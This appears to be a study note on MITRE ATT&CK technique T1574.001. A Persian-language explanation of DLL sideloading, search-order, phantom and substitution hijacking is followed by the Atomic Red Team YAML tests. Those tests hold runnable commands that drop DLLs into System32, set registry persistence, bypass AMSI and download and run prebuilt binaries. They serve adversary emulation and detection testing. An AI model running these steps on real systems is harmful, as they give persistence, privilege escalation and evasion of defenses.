
---

# Hijack Execution Flow: DLL

ID: T1574.001
Sub-technique of:  [T1574](https://attack.mitre.org/techniques/T1574)
ⓘ
Tactics: [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), [Defense Evasion](https://attack.mitre.org/tactics/TA0005)
ⓘ
Platforms: Windows
Contributors: Ami Holeston, CrowdStrike; Hajime Yanagishita, Macnica, Inc.; Marina Liang; Stefan Kanthak; Suguru Ishimaru, ITOCHU Cyber & Intelligence Inc.; Travis Smith, Tripwire; Wietze Beukema @Wietze; Will Alexander, CrowdStrike; Yusuke Niwa, ITOCHU Cyber & Intelligence Inc.
Version: 2.1
Created: 13 March 2020
Last Modified: 06 November 2025


---

# **🔵 هک جریان اجرای برنامه: DLL (Hijack Execution Flow: DLL)**  
**زیرتکنیک‌های دیگر هک جریان اجرا (۱۲ مورد)**

مهاجمان ممکن است از فایل‌های DLL برای رسیدن به مقاصدی مثل **پایداری (Persistence)**، **ارتقای سطح دسترسی (Privilege Escalation)** و **دور زدن دفاع‌ها** استفاده کنند. DLLها کتابخانه‌هایی هستند که شامل کد و داده‌اند و می‌توانند هم‌زمان توسط چند برنامه استفاده شوند.  
خود DLLها ذاتاً مخرب نیستند، اما مهاجمان می‌توانند از روش‌هایی مثل **سایدلودینگ (Side-loading)**، **هک ترتیب جستجوی DLL** و **Phantom DLL Hijacking** برای سوءاستفاده از آنها استفاده کنند.

---

# **راه‌های خاصی که مهاجمان برای سوءاستفاده از DLL استفاده می‌کنند:**

---

## **🔵 DLL Sideloading (سایدلودینگ DLL)**

مهاجمان ممکن است با سایدلود کردن DLLها، payload (کد مخرب) خودشان را اجرا کنند.  
در **سایدلودینگ** مهاجم DLLی را که یک برنامه باید لود کند **جعل می‌کند یا جایگزین می‌گذارد** و سپس یک برنامه‌ی قانونی را اجرا می‌کند تا payload او بارگذاری شود.

در این روش، فایل اجرایی سالم و payload مخرب ** کنار هم قرار می‌گیرند**.  
مهاجمان از این روش استفاده می‌کنند تا فعالیت‌های خود را زیر پوشش یک برنامه قابل‌اعتماد، قانونی و حتی دارای سطح دسترسی بالا انجام دهند.

- فایل اجرایی سالم معمولاً توسط آنتی‌ویروس‌ها مشکوک شناخته نمی‌شود.  
- خود payload هم ممکن است **رمزگذاری شده، پکت‌شده یا مبهم‌سازی شده باشد** تا تا زمانی که در حافظه برنامه معتبر لود نشده، قابل تشخیص نباشد.

همچنین مهاجمان می‌توانند:
- بسته‌های دیگر مثل **BPL (Borland Package Library)** را هم سایدلود کنند.
- چندین مرحله DLL sideloading را زنجیره کنند تا تحلیل را سخت کنند.  
  - مثلاً چند DLL بسازند و بخش‌های مختلف loader را در فایل‌های مختلف قرار دهند.  
  - یا از روش "loader-for-loader" استفاده کنند (DLL اول فقط DLL دوم را لود کند و DLL دوم payload واقعی را اجرا کند).

---

## **🔵 DLL Search Order Hijacking (هک ترتیب جستجوی DLL)**

در ویندوز وقتی برنامه‌ای می‌خواهد DLL لود کند، طبق یک **ترتیب مشخص** در مسیرهای مختلف دنبال آن می‌گردد.

مهاجم می‌تواند یک DLL مخرب را در مسیری قرار دهد که **در اولویت بالاتری** نسبت به محل DLL اصلی باشد.  
در این صورت ویندوز هنگام درخواست DLL توسط برنامه، **نسخه مخرب** را لود می‌کند.

---

## **🔵 DLL Redirection (تغییر مسیر DLL)**

مهاجمان می‌توانند از **تغییر مسیر DLL** استفاده کنند. با فعال‌کردن این قابلیت:
- از طریق رجیستری  
- یا با ایجاد یک فایل redirection  

برنامه مجبور می‌شود DLL را از یک مسیر متفاوت (که مهاجم تعیین کرده) بارگذاری کند.

---

## **🔵 Phantom DLL Hijacking (هک DLL فانتوم)**

در این روش مهاجم DLLهایی را هدف می‌گیرد که:
- برنامه به آنها اشاره می‌کند  
- اما **اصلاً وجود ندارند**

اگر مهاجم DLLی با همان نام و در همان مسیر بسازد، برنامه DLL مخرب را لود می‌کند.

---

## **🔵 DLL Substitution (جایگزینی DLL)**

مهاجم ممکن است DLLهای معتبر و موجود را **به‌جای نسخه اصلی جایگزین کند**:
- با همان نام  
- و در همان مسیر  

در این روش، DLL اصلی حذف می‌شود و نسخه مخرب جایگزین آن می‌شود.

---

## **🔵 نکات مهم:**

- برنامه آلوده‌شده ممکن است **عادی رفتار کند** چون DLL مخرب می‌تواند DLL اصلی را هم لود کند تا مشکلی در عملکرد دیده نشود.
- **Remote DLL Hijacking** نیز وجود دارد:  
  وقتی برنامه مسیر کاری خود را روی یک مسیر **راه‌دور (مثلاً Web Share)** قرار دهد و سپس DLL لود کند.  
  مهاجم می‌تواند DLL مخرب را آنجا قرار دهد.

- اگر DLL معتبر در حالت **سطح دسترسی بالا** اجرا شود، DLL مخرب نیز در همان سطح بالا اجرا خواهد شد.  
  در نتیجه این تکنیک برای **ارتقای دسترسی (Privilege Escalation)** نیز استفاده می‌شود.

---


	Atomic Test

```yaml
attack_technique: T1574.001
display_name: 'Hijack Execution Flow: DLL'
atomic_tests:
- name: DLL Search Order Hijacking - amsi.dll
  auto_generated_guid: 8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3
  description: |
    Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
    https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/

    Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.
  supported_platforms:
  - windows
  executor:
    command: |
      copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
      %APPDATA%\updater.exe -Command exit
    cleanup_command: |
      del %APPDATA%\updater.exe >nul 2>&1
      del %APPDATA%\amsi.dll >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Phantom Dll Hijacking - WinAppXRT.dll
  auto_generated_guid: 46ed938b-c617-429a-88dc-d49b5c9ffedb
  description: |
    .NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS
    Setting the environmental variable and dropping the phantom WinAppXRT.dll in e.g. c:\windows\system32 (or any other location accessible via PATH) will ensure the 
    WinAppXRT.dll is loaded everytime user launches an application using .NET.

    Upon successful execution, amsi.dll will be copied and renamed to WinAppXRT.dll and then WinAppXRT.dll will be copied to system32 folder for loading during execution of any .NET application.
  supported_platforms:
  - windows
  executor:
    command: |
      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
      ren %APPDATA%\amsi.dll WinAppXRT.dll
      copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll
      reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
    cleanup_command: |
      reg delete "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /f
      del %windir%\System32\WinAppXRT.dll
      del %APPDATA%\WinAppXRT.dll
    name: command_prompt
    elevation_required: true    
- name: Phantom Dll Hijacking - ualapi.dll
  auto_generated_guid: 5898902d-c5ad-479a-8545-6f5ab3cfc87f
  description: |
    Re-starting the Print Spooler service leads to C:\Windows\System32\ualapi.dll being loaded
    A malicious ualapi.dll placed in the System32 directory will lead to its execution whenever the system starts

    Upon successful execution, amsi.dll will be copied and renamed to ualapi.dll and then ualapi.dll will be copied to system32 folder for loading during system restart.
    Print Spooler service is also configured to auto start. Reboot of system is required
  supported_platforms:
  - windows
  executor:
    command: |
      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
      ren %APPDATA%\amsi.dll ualapi.dll
      copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll
      sc config Spooler start=auto
    cleanup_command: |
      del %windir%\System32\ualapi.dll
      del %APPDATA%\ualapi.dll
    name: command_prompt
    elevation_required: true
- name: DLL Side-Loading using the Notepad++ GUP.exe binary
  auto_generated_guid: 65526037-7079-44a9-bda1-2cb624838040
  description: |
    GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
    Upon execution, calc.exe will be opened.
  supported_platforms:
  - windows
  input_arguments:
    process_name:
      description: Name of the created process
      type: string
      default: calculator.exe
    gup_executable:
      description: GUP is an open source signed binary used by Notepad++ for software updates
      type: path
      default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Gup.exe binary must exist on disk at specified location (#{gup_executable})
    prereq_command: |
      if (Test-Path "#{gup_executable}") {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory (split-path "#{gup_executable}") -ErrorAction ignore | Out-Null
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/GUP.exe?raw=true" -OutFile "#{gup_executable}"
  executor:
    command: |
      "#{gup_executable}"
    cleanup_command: |
      taskkill /F /IM #{process_name} >nul 2>&1
    name: command_prompt
- name: DLL Side-Loading using the dotnet startup hook environment variable
  auto_generated_guid: d322cdd7-7d60-46e3-9111-648848da7c02
  description: |
    Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)
  supported_platforms:
  - windows
  input_arguments:
    process_name:
      description: Name of the created process
      type: string
      default: calculator.exe
    preloader_dll:
      description: library for interfacing with the dotnet framework
      type: path
      default: PathToAtomicsFolder\T1574.002\bin\preloader.dll
  dependency_executor_name: powershell
  dependencies:
  - description: |
      .Net SDK must be installed
    prereq_command: |
      if (Test-Path "C:\Program Files\dotnet\dotnet.exe") {exit 0} else {exit 1}
    get_prereq_command: |
      winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null
      echo.
  - description: |
      preloader must exist
    prereq_command: |
      if (Test-Path "#{preloader_dll}") {exit 0} else {exit 1}
    get_prereq_command: |
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/preloader.dll?raw=true" -OutFile "#{preloader_dll}"
  executor:
    command: |
      set DOTNET_STARTUP_HOOKS="#{preloader_dll}"
      dotnet -h > nul
      echo.
    cleanup_command: |
      taskkill /F /IM #{process_name} >nul 2>&1
    name: command_prompt
- name: DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE
  auto_generated_guid: c095ad8e-4469-4d33-be9d-6f6d1fb21585
  description: |
    Various threat actors and malware have been found side loading a masqueraded "KeyScramblerIE.dll" through "KeyScrambler.exe", which can load further executables embedded in modified KeyScramblerIE.dll file.
  supported_platforms:
  - windows      
  executor:
    command: |-
      Write-Host 1.Downloading KeyScrambler from official website to temp directory
      Invoke-WebRequest -Uri "https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe" -OutFile $env:Temp\KeyScrambler_Setup.exe
      Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory
      Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait
      Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp
      Copy-Item "C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe" -Destination $env:TEMP\KeyScrambler.exe
      Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup
      Start-Process -FilePath $env:Temp\KeyScrambler.exe
      Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker
    cleanup_command: |-
      Write-Host 1.Kindly close the popup window asking for KeyScramblerIE.dll ,so that it gets deleted.
      
      Remove-Item -Path $env:Temp\KeyScrambler_Setup.exe
      Start-Process -FilePath "C:\Program Files (x86)\KeyScrambler\Uninstall.exe" -ArgumentList /S -Wait
      Remove-Item -Path $env:Temp\KeyScrambler.exe
      Write-Host 2.KeyScrambler cleanup completed successfully.
    name: powershell
    elevation_required: true
```